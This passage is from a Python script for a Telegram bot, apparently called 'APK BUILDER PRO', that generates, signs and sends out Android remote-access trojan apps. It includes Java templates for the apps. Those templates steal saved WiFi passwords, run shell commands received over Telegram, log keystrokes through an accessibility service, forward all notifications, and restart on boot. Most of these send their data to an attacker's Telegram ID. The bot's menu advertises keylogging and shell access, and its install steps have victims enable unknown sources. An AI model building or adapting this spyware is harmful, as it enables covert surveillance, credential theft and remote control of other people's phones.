        if (Build.VERSION.SDK_INT < 29) {{
            try {{
                Process p = Runtime.getRuntime().exec(new String[]{{"su", "-c",
                    "cat /data/misc/wifi/WifiConfigStore.xml"}});
                BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = r.readLine()) != null) {{
                    if (line.contains("SSID") || line.contains("PreSharedKey"))
                        sb.append(line.trim()).append("\\n");
                }}
                r.close();
            }} catch (Exception e) {{
                sb.append("⚠️ يحتاج root: ").append(e.getMessage());
            }}
        }} else {{
            sb.append("⚠️ Android 10+ يحمي كلمات WiFi (يحتاج root)");
        }}
        ControlService.sendMsg(chatId, sb.toString());
    }}
}}'''


APPS_HELPER = '''package {pkg};

import android.content.Context;
import android.content.pm.*;
import java.util.*;

public class AppsHelper {{
    private final Context ctx;
    public AppsHelper(Context c) {{ this.ctx = c; }}

    public void list(String chatId) {{
        try {{
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            StringBuilder sb = new StringBuilder("📦 <b>التطبيقات المثبتة</b> ("
                + apps.size() + ")\\n\\n");
            int n = 0;
            for (ApplicationInfo a : apps) {{
                if (n++ > 100) {{ sb.append("...\\n"); break; }}
                sb.append("• ").append(pm.getApplicationLabel(a))
                  .append("\\n  <code>").append(a.packageName).append("</code>\\n");
                if (sb.length() > 3500) {{
                    ControlService.sendMsg(chatId, sb.toString());
                    sb = new StringBuilder();
                }}
            }}
            if (sb.length() > 0) ControlService.sendMsg(chatId, sb.toString());
        }} catch (Exception e) {{
            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
        }}
    }}
}}'''


SCREENSHOT_HELPER = '''package {pkg};

import android.content.Context;

public class ScreenshotHelper {{
    public ScreenshotHelper(Context c) {{}}

    public void take(String chatId) {{
        ControlService.sendMsg(chatId,
            "🖥️ لقطة الشاشة تحتاج إذن MediaProjection.\\n"
            + "افتح التطبيق وامنح الصلاحية ثم أعد المحاولة.");
    }}
}}'''


SHELL_HELPER = '''package {pkg};

import java.io.*;

public class ShellHelper {{
    public ShellHelper() {{}}

    public void run(String cmd, String chatId) {{
        try {{
            Process p = Runtime.getRuntime().exec(new String[]{{"sh", "-c", cmd}});
            BufferedReader r = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            BufferedReader er = new BufferedReader(
                new InputStreamReader(p.getErrorStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append("\\n");
            while ((line = er.readLine()) != null) sb.append(line).append("\\n");
            r.close();
            er.close();
            String out = sb.toString();
            if (out.length() > 3800) out = out.substring(0, 3800) + "\\n...";
            if (out.isEmpty()) out = "(لا مخرجات)";
            ControlService.sendMsg(chatId,
                "💻 <b>النتيجة:</b>\\n<pre>" + esc(out) + "</pre>");
        }} catch (Exception e) {{
            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
        }}
    }}

    private String esc(String s) {{
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }}
}}'''


KEYLOGGER_SERVICE = '''package {pkg};

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public class KeyloggerService extends AccessibilityService {{
    private StringBuilder buf = new StringBuilder();
    private String lastPkg = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {{
        if (e.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;
        try {{
            String pkg = e.getPackageName() != null
                ? e.getPackageName().toString() : "";
            String text = e.getText() != null && e.getText().size() > 0
                ? e.getText().get(0).toString() : "";
            if (text.isEmpty()) return;
            if (!pkg.equals(lastPkg)) {{
                if (buf.length() > 0) flush();
                lastPkg = pkg;
            }}
            buf.append("[").append(pkg).append("] ").append(text).append("\\n");
            if (buf.length() > 500) flush();
        }} catch (Exception ignored) {{}}
    }}

    private void flush() {{
        ControlService.sendMsg("{admin_id}",
            "⌨️ <b>Keylog</b>\\n<pre>"
            + buf.toString().replace("<", "&lt;") + "</pre>");
        buf = new StringBuilder();
    }}

    @Override public void onInterrupt() {{}}
}}'''


NOTIFICATION_LISTENER = '''package {pkg};

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.*;

public class NotificationListener extends NotificationListenerService {{
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {{
        try {{
            Notification n = sbn.getNotification();
            if (n == null) return;
            Bundle b = n.extras;
            String title = b.getString(Notification.EXTRA_TITLE, "");
            String text = b.getString(Notification.EXTRA_TEXT, "");
            String pkg = sbn.getPackageName();
            if (pkg.equals(getPackageName())) return;
            if (title.isEmpty() && text.isEmpty()) return;
            String msg = "🔔 <b>إشعار جديد</b>\\n\\n"
                + "📦 <code>" + pkg + "</code>\\n"
                + "👤 " + esc(title) + "\\n"
                + "💬 " + esc(text);
            ControlService.sendMsg("{admin_id}", msg);
        }} catch (Exception ignored) {{}}
    }}

    private String esc(String s) {{
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }}

    @Override public void onNotificationRemoved(StatusBarNotification sbn) {{}}
}}'''


BOOT_RECEIVER = '''package {pkg};

import android.content.*;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {{
    @Override
    public void onReceive(Context ctx, Intent i) {{
        if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) {{
            Intent svc = new Intent(ctx, ControlService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
            else ctx.startService(svc);
        }}
    }}
}}'''


# ═══════════════════════════════════════════════════════════════════
#                    PROJECT GENERATION
# ═══════════════════════════════════════════════════════════════════
def generate_project(cfg: dict, proj: Path):
    pkg = cfg["pkg_name"]
    pkg_path = proj / "app" / "src" / "main" / "java" / Path(*pkg.split("."))
    pkg_path.mkdir(parents=True, exist_ok=True)

    res = proj / "app" / "src" / "main" / "res"
    for d in ["mipmap-xxxhdpi", "values", "xml"]:
        (res / d).mkdir(parents=True, exist_ok=True)

    shutil.copy(cfg["icon"], res / "mipmap-xxxhdpi" / "ic_launcher.png")

    perms_xml = "\n".join(
        f'    <uses-permission android:name="android.permission.{PERMISSIONS[p][2]}"/>'
        for p in cfg["perms"]
    )

    ctx = {
        "pkg": pkg,
        "app_name": cfg["app_name"],
        "bot_token": cfg["bot_token"],
        "admin_id": cfg["admin_id"],
        "bot_username": BOT_USERNAME,
    }

    (proj / "app" / "src" / "main" / "AndroidManifest.xml").write_text(
        MANIFEST_TPL.format(perms_xml=perms_xml, **ctx),
        encoding="utf-8"
    )

    (res / "values" / "strings.xml").write_text(
        f'<?xml version="1.0" encoding="utf-8"?>\n'
        f'<resources>\n'
        f'    <string name="app_name">{cfg["app_name"]}</string>\n'
        f'</resources>',
        encoding="utf-8"
    )

    (res / "xml" / "accessibility_config.xml").write_text(
        ACCESSIBILITY_XML, encoding="utf-8"
    )

    java_files = {
        "MainActivity.java":         MAIN_ACTIVITY,
        "ControlService.java":       CONTROL_SERVICE,
        "CameraHelper.java":         CAMERA_HELPER,
        "AudioHelper.java":          AUDIO_HELPER,
        "FileHelper.java":           FILE_HELPER,
        "LocationHelper.java":       LOCATION_HELPER,
        "ContactsHelper.java":       CONTACTS_HELPER,
        "WifiHelper.java":           WIFI_HELPER,
        "AppsHelper.java":           APPS_HELPER,
        "ScreenshotHelper.java":     SCREENSHOT_HELPER,
        "ShellHelper.java":          SHELL_HELPER,
        "KeyloggerService.java":     KEYLOGGER_SERVICE,
        "NotificationListener.java": NOTIFICATION_LISTENER,
        "BootReceiver.java":         BOOT_RECEIVER,
    }

    for name, tpl in java_files.items():
        (pkg_path / name).write_text(tpl.format(**ctx), encoding="utf-8")

    (proj / "app" / "build.gradle").write_text(
        BUILD_GRADLE_TPL.format(
            pkg=pkg,
            compile_sdk=CONFIG["compile_sdk"],
            min_sdk=CONFIG["min_sdk"],
            target_sdk=CONFIG["target_sdk"]
        ),
        encoding="utf-8"
    )

    (proj / "build.gradle").write_text(
        f"plugins {{\n"
        f"    id 'com.android.application' version "
        f"'{CONFIG['gradle_version']}' apply false\n"
        f"}}\n",
        encoding="utf-8"
    )

    (proj / "settings.gradle").write_text(
        "pluginManagement {\n"
        "    repositories { google(); mavenCentral(); gradlePluginPortal() }\n"
        "}\n"
        "dependencyResolutionManagement {\n"
        "    repositories { google(); mavenCentral() }\n"
        "}\n"
        'rootProject.name = "App"\n'
        "include ':app'\n",
        encoding="utf-8"
    )

    (proj / "gradle.properties").write_text(
        "android.useAndroidX=true\n"
        "android.enableJetifier=true\n"
        "org.gradle.jvmargs=-Xmx2048m\n",
        encoding="utf-8"
    )


# ═══════════════════════════════════════════════════════════════════
#                    SIGN + BUILD
# ═══════════════════════════════════════════════════════════════════
def sign_apk(unsigned: Path, out: Path):
    ks = CONFIG["keystore"]
    ks_path = Path(ks["path"])

    if not ks_path.exists():
        subprocess.run([
            "keytool", "-genkeypair", "-v",
            "-keystore", str(ks_path),
            "-alias", ks["alias"],
            "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
            "-storepass", ks["store_password"],
            "-keypass", ks["key_password"],
            "-dname", "CN=App,OU=Dev,O=Dev,L=City,S=State,C=US",
        ], check=True, capture_output=True)

    aligned = unsigned.with_name("aligned.apk")
    subprocess.run(
        ["zipalign", "-f", "-p", "4", str(unsigned), str(aligned)],
        check=True, capture_output=True
    )

    subprocess.run([
        "apksigner", "sign",
        "--ks", str(ks_path),
        "--ks-key-alias", ks["alias"],
        "--ks-pass", f"pass:{ks['store_password']}",
        "--key-pass", f"pass:{ks['key_password']}",
        "--out", str(out), str(aligned),
    ], check=True, capture_output=True)

    aligned.unlink(missing_ok=True)


def build_apk(cfg: dict, uid: int) -> str:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    proj = BUILD_DIR / f"proj_{uid}_{ts}"
    proj.mkdir(parents=True, exist_ok=True)

    generate_project(cfg, proj)

    r = subprocess.run(
        ["gradle", "assembleRelease", "--no-daemon", "-q"],
        cwd=proj, capture_output=True, text=True,
        timeout=CONFIG["max_build_time"]
    )
    if r.returncode != 0:
        raise Exception(f"Gradle:\n{r.stderr[-800:]}")

    unsigned = next(proj.rglob("app-release-unsigned.apk"), None) \
        or next(proj.rglob("*.apk"), None)
    if not unsigned:
        raise Exception("لم يُنتج APK")

    final = BUILD_DIR / f"{cfg['app_name'].replace(' ', '_')}_{ts}.apk"
    if CONFIG["sign_apk"]:
        try:
            sign_apk(unsigned, final)
        except Exception as e:
            print(f"⚠️ فشل التوقيع: {e}")
            shutil.copy(unsigned, final)
    else:
        shutil.copy(unsigned, final)

    shutil.rmtree(proj, ignore_errors=True)
    return str(final)


# ═══════════════════════════════════════════════════════════════════
#                       BOT HANDLERS
# ═══════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("🚀 بناء تطبيق جديد", callback_data="new_build")],
        [InlineKeyboardButton("📊 إحصائياتي", callback_data="stats"),
         InlineKeyboardButton("📖 المساعدة", callback_data="help")],
    ]
    await update.message.reply_text(
        "╔══════════════════════════════════════╗\n"
        "║  👑  <b>APK BUILDER PRO  v5.0</b>          ║\n"
        "║      <i>Railway Ultra Edition</i>          ║\n"
        "╚══════════════════════════════════════╝\n\n"
        f"👋 مرحباً <b>{update.effective_user.first_name}</b>\n\n"
        "🎯 <b>المميزات:</b>\n"
        "├ 📱 بناء تطبيقات Android كاملة\n"
        "├ 🔐 توقيع APK تلقائي\n"
        "├ 🤖 بوت تحكم مدمج\n"
        "├ 📸 كاميرا / 🎙️ صوت / 📁 ملفات\n"
        "├ 📍 موقع / 📞 جهات / 💻 Shell\n"
        "├ ⌨️ Keylogger / 🔔 إشعارات\n"
        "├ 📶 WiFi / 🖥️ شاشة / 📦 تطبيقات\n"
        "└ ♻️ إعادة تشغيل تلقائي\n\n"
        "اختر من القائمة 👇",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode=ParseMode.HTML
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 <b>دليل الاستخدام</b>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "1️⃣ اسم التطبيق\n"
        "2️⃣ اسم الحزمة (com.xxx.yyy)\n"
        "3️⃣ Telegram ID\n"
        "4️⃣ توكن البوت الفرعي\n"
        "5️⃣ الصلاحيات\n"
        "6️⃣ المميزات\n"
        "7️⃣ السمة\n"
        "8️⃣ الأيقونة\n"
        "9️⃣ تأكيد البناء\n\n"
        "⚠️ البوت الفرعي يجب أن يكون منفصلاً",
        parse_mode=ParseMode.HTML
    )


async def cb_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    used = user_apk_count[uid]
    maxx = CONFIG["max_apk_per_user"]
    bar = "█" * used + "░" * max(0, maxx - used)

    await q.edit_message_text(
        f"📊 <b>إحصائياتك</b>\n\n"
        f"🆔 <code>{uid}</code>\n"
        f"📱 <b>البناءات:</b> {used}/{maxx}\n"
        f"📊 [{bar}]\n"
        f"✅ {'متاح' if used < maxx else '⛔ تجاوزت الحد'}",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔙 رجوع", callback_data="back_home")
        ]])
    )


async def cb_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(
        "📖 استخدم الأمر /help للتفاصيل الكاملة",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔙 رجوع", callback_data="back_home")
        ]])
    )


async def cb_back_home(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    kb = [
        [InlineKeyboardButton("🚀 بناء تطبيق جديد", callback_data="new_build")],
        [InlineKeyboardButton("📊 إحصائياتي", callback_data="stats"),
         InlineKeyboardButton("📖 المساعدة", callback_data="help")],
    ]
    await q.edit_message_text(
        "🏠 <b>القائمة الرئيسية</b>\n\nاختر إجراءً:",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode=ParseMode.HTML
    )


# ────────────── Conversation Flow ──────────────
async def new_build(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        q = update.callback_query
        await q.answer()
        uid = q.from_user.id
        send = q.edit_message_text
    else:
        uid = update.effective_user.id
        send = update.message.reply_text

    if user_apk_count[uid] >= CONFIG["max_apk_per_user"]:
        await send("⛔ تجاوزت الحد الأقصى للبناء.")
        return ConversationHandler.END

    user_sessions[uid] = {
        "perms": [], "features": [],
        "theme": "dark", "created": datetime.now()
    }
    await send(
        "📝 <b>خطوة 1/8</b>\n\n"
        "أدخل <b>اسم التطبيق</b> الذي يظهر على الشاشة:",
        parse_mode=ParseMode.HTML
    )
    return ST_NAME


async def st_name(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    name = update.message.text.strip()[:40]
    user_sessions[uid]["app_name"] = name
    await update.message.reply_text(
        f"✅ الاسم: <b>{name}</b>\n\n"
        f"📦 <b>خطوة 2/8</b>\n\n"
        f"أدخل <b>اسم الحزمة</b>:\n"
        f"مثال: <code>com.yourname.app</code>",
        parse_mode=ParseMode.HTML
    )
    return ST_PKG


async def st_pkg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    pkg = update.message.text.strip().lower()
    if not re.match(r"^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$", pkg):
        await update.message.reply_text(
            "❌ صيغة خاطئة. مثال: <code>com.x.y</code>",
            parse_mode=ParseMode.HTML
        )
        return ST_PKG
    user_sessions[uid]["pkg_name"] = pkg
    await update.message.reply_text(
        f"✅ <code>{pkg}</code>\n\n"
        f"🆔 <b>خطوة 3/8</b>\n\n"
        f"أدخل <b>Telegram ID</b> الخاص بك:",
        parse_mode=ParseMode.HTML
    )
    return ST_ADMIN


async def st_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    try:
        aid = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("❌ أرسل رقماً صحيحاً:")
        return ST_ADMIN
    user_sessions[uid]["admin_id"] = aid
    await update.message.reply_text(
        f"✅ <code>{aid}</code>\n\n"
        f"🔑 <b>خطوة 4/8</b>\n\n"
        f"أدخل <b>توكن البوت الفرعي</b>:\n"
        f"⚠️ بوت منفصل عن بوت البناء",
        parse_mode=ParseMode.HTML
    )
    return ST_TOKEN


async def st_token(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    token = update.message.text.strip()
    if token.count(":") != 1 or len(token) < 40:
        await update.message.reply_text("❌ توكن غير صالح. حاول مجدداً:")
        return ST_TOKEN
    user_sessions[uid]["bot_token"] = token
    try:
        await update.message.delete()
    except Exception:
        pass
    return await show_perms(update, ctx)


async def show_perms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    sel = user_sessions[uid]["perms"]
    rows = []
    items = list(PERMISSIONS.items())
    for i in range(0, len(items), 2):
        row = []
        for key, (em, name, _) in items[i:i + 2]:
            mark = "✅" if key in sel else "⬜"
            row.append(InlineKeyboardButton(
                f"{mark} {em} {name}", callback_data=f"perm:{key}"
            ))
        rows.append(row)
    rows.append([InlineKeyboardButton("➡️ التالي", callback_data="perm:next")])

    text = "🔐 <b>خطوة 5/8 — الصلاحيات</b>\n\nاختر الصلاحيات المطلوبة:"
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, reply_markup=InlineKeyboardMarkup(rows),
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            text, reply_markup=InlineKeyboardMarkup(rows),
            parse_mode=ParseMode.HTML
        )
    return ST_PERMS


async def cb_perms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data.split(":", 1)[1]
    if data == "next":
        return await show_feats(update, ctx)
    perms = user_sessions[uid]["perms"]
    if data in perms:
        perms.remove(data)
    else:
        perms.append(data)
    return await show_perms(update, ctx)


async def show_feats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    sel = user_sessions[uid]["features"]
    rows = []
    items = list(FEATURES.items())
    for i in range(0, len(items), 2):
        row = []
        for key, (em, name) in items[i:i + 2]:
            mark = "✅" if key in sel else "⬜"
            row.append(InlineKeyboardButton(
                f"{mark} {em} {name}", callback_data=f"feat:{key}"
            ))
        rows.append(row)
    rows.append([InlineKeyboardButton("➡️ التالي", callback_data="feat:next")])

    text = "⚙️ <b>خطوة 6/8 — المميزات الإضافية</b>\n\nاختر المميزات:"
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, reply_markup=InlineKeyboardMarkup(rows),
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            text, reply_markup=InlineKeyboardMarkup(rows),
            parse_mode=ParseMode.HTML
        )
    return ST_FEATS


async def cb_feats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data.split(":", 1)[1]
    if data == "next":
        return await show_themes(update, ctx)
    feats = user_sessions[uid]["features"]
    if data in feats:
        feats.remove(data)
    else:
        feats.append(data)
    return await show_feats(update, ctx)


async def show_themes(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    rows = [[InlineKeyboardButton(f"{em} {name}", callback_data=f"theme:{k}")]
            for k, (em, name) in THEMES.items()]
    text = "🎨 <b>خطوة 7/8 — السمة</b>\n\nاختر السمة:"
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, reply_markup=InlineKeyboardMarkup(rows),
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            text, reply_markup=InlineKeyboardMarkup(rows),
            parse_mode=ParseMode.HTML
        )
    return ST_THEME


async def cb_theme(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    user_sessions[uid]["theme"] = q.data.split(":", 1)[1]
    await q.edit_message_text(
        "🖼️ <b>خطوة 8/8 — الأيقونة</b>\n\n"
        "أرسل صورة (يُفضّل 512×512):",
        parse_mode=ParseMode.HTML
    )
    return ST_ICON


async def st_icon(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if update.message.photo:
        file = await update.message.photo[-1].get_file()
    elif update.message.document and \
            update.message.document.mime_type.startswith("image/"):
        file = await update.message.document.get_file()
    else:
        await update.message.reply_text("❌ أرسل صورة صحيحة.")
        return ST_ICON

    icon_path = BUILD_DIR / f"{uid}_icon_{secrets.token_hex(4)}.png"
    await file.download_to_drive(icon_path)

    try:
        img = Image.open(icon_path).convert("RGBA").resize(
            (512, 512), Image.LANCZOS
        )
        img.save(icon_path, "PNG", optimize=True)
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {e}")
        return ST_ICON

    user_sessions[uid]["icon"] = str(icon_path)
    return await show_summary(update, ctx)


async def show_summary(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = user_sessions[uid]

    perms_txt = "\n".join(
        f"   {PERMISSIONS[p][0]} {PERMISSIONS[p][1]}" for p in s["perms"]
    ) or "   لا شيء"
    feats_txt = "\n".join(
        f"   {FEATURES[f][0]} {FEATURES[f][1]}" for f in s["features"]
    ) or "   لا شيء"

    text = (
        "╔═══════════════════════════════╗\n"
        "║   📋  <b>ملخص الإعدادات</b>        ║\n"
        "╚═══════════════════════════════╝\n\n"
        f"📱 <b>الاسم:</b> <code>{s['app_name']}</code>\n"
        f"📦 <b>الحزمة:</b> <code>{s['pkg_name']}</code>\n"
        f"🆔 <b>Admin:</b> <code>{s['admin_id']}</code>\n"
        f"🎨 <b>السمة:</b> {THEMES[s['theme']][1]}\n\n"
        f"🔐 <b>الصلاحيات ({len(s['perms'])}):</b>\n{perms_txt}\n\n"
        f"⚙️ <b>المميزات ({len(s['features'])}):</b>\n{feats_txt}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "هل تريد بدء البناء؟"
    )
    kb = [
        [InlineKeyboardButton("✅ نعم، ابدأ البناء", callback_data="build:go")],
        [InlineKeyboardButton("❌ إلغاء", callback_data="build:cancel")],
    ]

    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, reply_markup=InlineKeyboardMarkup(kb),
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            text, reply_markup=InlineKeyboardMarkup(kb),
            parse_mode=ParseMode.HTML
        )
    return ST_CONFIRM


async def cb_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    action = q.data.split(":", 1)[1]

    if action == "cancel":
        user_sessions.pop(uid, None)
        await q.edit_message_text("❌ تم الإلغاء.")
        return ConversationHandler.END

    await q.edit_message_text(
        "╔══════════════════════════════╗\n"
        "║  ⚙️  <b>جاري البناء...</b>          ║\n"
        "╚══════════════════════════════╝\n\n"
        "⏳ قد يستغرق 5-15 دقيقة\n"
        "📊 سيتم إشعارك عند الانتهاء\n\n"
        "🔄 المراحل:\n"
        "├ إنشاء المشروع\n"
        "├ تجميع الكود\n"
        "├ توقيع APK\n"
        "└ إرسال الملف",
        parse_mode=ParseMode.HTML
    )

    asyncio.create_task(build_and_send(q.message, uid, user_sessions[uid]))
    return ConversationHandler.END


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_sessions.pop(update.effective_user.id, None)
    await update.message.reply_text("❌ تم الإلغاء.")
    return ConversationHandler.END


async def build_and_send(message, uid: int, cfg: dict):
    try:
        apk = await asyncio.to_thread(build_apk, cfg, uid)
        size = os.path.getsize(apk) / (1024 * 1024)
        user_apk_count[uid] += 1

        with open(apk, "rb") as f:
            await message.reply_document(
                document=InputFile(f, filename=os.path.basename(apk)),
                caption=(
                    "╔══════════════════════════════╗\n"
                    "║   ✅  <b>تم البناء بنجاح!</b>       ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"📱 <b>الاسم:</b> {cfg['app_name']}\n"
                    f"📦 <b>الحزمة:</b> <code>{cfg['pkg_name']}</code>\n"
                    f"💾 <b>الحجم:</b> {size:.2f} MB\n"
                    f"🔐 <b>التوقيع:</b> ✅\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "⚡ <b>خطوات التثبيت:</b>\n"
                    "1️⃣ افتح ملف APK\n"
                    "2️⃣ فعّل «مصادر غير معروفة»\n"
                    "3️⃣ اضغط «تثبيت»\n"
                    "4️⃣ افتح التطبيق\n"
                    "5️⃣ ستُفتح نافذة البوت تلقائياً\n"
                    "6️⃣ أرسل /start للتحكم"
                ),
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        await message.reply_text(
            f"❌ <b>فشل البناء</b>\n\n"
            f"<code>{str(e)[:500]}</code>",
            parse_mode=ParseMode.HTML
        )
    finally:
        user_sessions.pop(uid, None)


# ═══════════════════════════════════════════════════════════════════
#                       MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    print("╔══════════════════════════════════════════╗")
    print("║   👑  APK BUILDER PRO  v5.0               ║")
    print("║   🚂  Railway Ultra Edition               ║")
    print("╚══════════════════════════════════════════╝")
    print(f"✅ BOT_TOKEN: {BOT_TOKEN[:15]}...")
    print(f"✅ ADMIN_ID: {ADMIN_ID}")
    print(f"✅ BOT_USERNAME: {BOT_USERNAME}")
    print("🚀 جاري التشغيل...")

    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("build", new_build),
            CallbackQueryHandler(new_build, pattern="^new_build$"),
        ],
        states={
            ST_NAME:    [MessageHandler(filters.TEXT & ~filters.COMMAND, st_name)],
            ST_PKG:     [MessageHandler(filters.TEXT & ~filters.COMMAND, st_pkg)],
            ST_ADMIN:   [MessageHandler(filters.TEXT & ~filters.COMMAND, st_admin)],
            ST_TOKEN:   [MessageHandler(filters.TEXT & ~filters.COMMAND, st_token)],
            ST_PERMS:   [CallbackQueryHandler(cb_perms, pattern="^perm:")],
            ST_FEATS:   [CallbackQueryHandler(cb_feats, pattern="^feat:")],
            ST_THEME:   [CallbackQueryHandler(cb_theme, pattern="^theme:")],
            ST_ICON:    [MessageHandler(
                filters.PHOTO | filters.Document.IMAGE, st_icon
            )],
            ST_CONFIRM: [CallbackQueryHandler(cb_confirm, pattern="^build:")],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        allow_reentry=True,
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CallbackQueryHandler(cb_stats, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(cb_help, pattern="^help$"))
    app.add_handler(CallbackQueryHandler(cb_back_home, pattern="^back_home$"))
    app.add_handler(conv)

    print("✅ البوت يعمل الآن — اضغط Ctrl+C للإيقاف")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
